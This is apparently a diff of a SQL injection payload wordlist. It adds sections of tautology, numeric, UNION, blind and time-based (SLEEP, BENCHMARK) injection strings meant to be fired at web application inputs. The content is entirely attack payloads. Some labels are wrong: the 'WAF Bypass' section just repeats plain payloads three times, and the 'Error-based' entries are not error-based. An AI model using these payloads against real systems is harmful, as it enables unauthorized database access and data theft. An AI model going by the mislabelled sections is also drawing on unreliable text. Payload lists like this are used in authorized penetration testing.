@@ -1,8 +1,5 @@
-# Basic SQLi payloads
-' OR '1'='1
-' OR '1'='1' --
-' OR '1'='1' /*
-' OR '1'='1' #
+# Basic SQL Injection
+' OR '1'='1'
 ' OR '1'='1' --
 ' OR '1'='1' /*
 ' OR '1'='1' #
@@ -10,20 +7,56 @@
 ' OR '1'='1' /*
 ' OR '1'='1' #
 
-# Time-based payloads
-' OR SLEEP(5) --
-' OR SLEEP(5) /*
-' OR SLEEP(5) #
+# Numeric Injection
+1 OR 1=1
+1 OR 1=1 --
+1 OR 1=1 /*
+1 OR 1=1 #
 
-# Error-based payloads
+# Union-based Injection
 ' UNION SELECT 1,2,3,4,5 --
 ' UNION SELECT 1,2,3,4,5 /*
 ' UNION SELECT 1,2,3,4,5 #
+' UNION ALL SELECT 1,2,3,4,5 --
+' UNION ALL SELECT 1,2,3,4,5 /*
+' UNION ALL SELECT 1,2,3,4,5 #
 
-# Blind SQLi payloads
+# Error-based Injection
+' OR 1=1 AND 1=0
+' OR 1=1 AND 1=0 --
+' OR 1=1 AND 1=0 /*
+' OR 1=1 AND 1=0 #
+' OR 1=1 AND 1=0 AND 1=0
+' OR 1=1 AND 1=0 AND 1=0 --
+' OR 1=1 AND 1=0 AND 1=0 /*
+' OR 1=1 AND 1=0 AND 1=0 #
+
+# Blind SQL Injection
 ' AND 1=1 --
 ' AND 1=1 /*
 ' AND 1=1 #
 ' AND 1=0 --
 ' AND 1=0 /*
 ' AND 1=0 #
+' AND 1=1 AND SLEEP(5) --
+' AND 1=1 AND SLEEP(5) /*
+' AND 1=1 AND SLEEP(5) #
+
+# Time-based Injection
+' AND SLEEP(5) --
+' AND SLEEP(5) /*
+' AND SLEEP(5) #
+' AND BENCHMARK(1000000,MD5(1)) --
+' AND BENCHMARK(1000000,MD5(1)) /*
+' AND BENCHMARK(1000000,MD5(1)) #
+
+# WAF Bypass
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
